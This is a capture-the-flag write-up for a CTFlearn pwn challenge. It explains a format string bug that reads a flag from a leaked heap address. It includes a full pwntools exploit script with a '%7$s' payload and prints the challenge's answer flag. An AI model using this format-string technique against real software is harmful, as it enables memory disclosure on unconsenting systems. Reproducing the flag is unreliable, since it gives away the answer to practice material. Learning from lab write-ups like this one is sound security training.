# Readme
> Write-up author: jon-brandy
## DESCRIPTION:
I have loaded a flag for you. Just read it ;)

nc rivit.dev 10007

## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped. Also we're given the source code!

```
┌──(brandy㉿bread-yolk)-[~/Downloads/ctflearn/task]
└─$ file task
task: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d38bf9df4eb8b951df955703aa60132d5772fd5f, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/87f9bc36-8f45-4857-a35b-77bec00d8c3b)


2. Reviewing the source code, found a FSB and noticed the flag is allocated on the heap.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/e5a9f5b0-b8e8-4227-9fc5-931eedb78b12)


3. Remembering PIE is enabled and ASLR is on, hence we need to bruteforce the exact heap address where it stored the flag.
4. But luckily the author leak the flag location at the heap for us.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/752cc6ef-5d31-4edc-b6fb-aee891fa7c78)


5. Awesome! Anyway if you want to check whether the leaked heap address does stores the flag or not, you can set a breakpoint at printf call using gdbscript, then run `vis_heap_chunk` if you are using pwndbg.

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/6f966d18-9281-44c7-97bb-70f8dd120e61)


6. Nice, now let's find the offset which pointing to the flag at heap address.
7. Very easy to find it, simply search for offset which is writeable and the next offset is the one pointing to our flag at the heap.

> SEARCHING OFFSET

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/244a22ae-f209-4b67-9120-5f068a7d6670)


8. Great! Here's the full script:

> SCRIPT

```py
from pwn import * 

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
breakrva 0x1378
continue
""".format(**locals())

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'DEBUG'
# context.log_level = 'INFO'

def grab_heap_addr():
    sh.recvuntil(b'buffer: ')
    flag_addr = sh.recvline().strip()
    flag_addr = int(flag_addr, 16)
    return flag_addr

sh = start()

heap_addr = grab_heap_addr()
success(f'FLAG IN HEAP --> {hex(heap_addr)}')
p = b'%7$s'.ljust(8,b'A')
p += pack(heap_addr)
sh.sendline(p)

sh.interactive()
```

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/d298d338-5fdc-4c9e-a78f-28af8c4883b1)


9. Succeed locally! Let's send it remotely.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/9552cdb8-2503-40fa-a53b-c3c6d82bf204)


10. Got the flag!


## FLAG

```
CTFlearn{ju57_4n_4rb17r4ry_r34d}
```
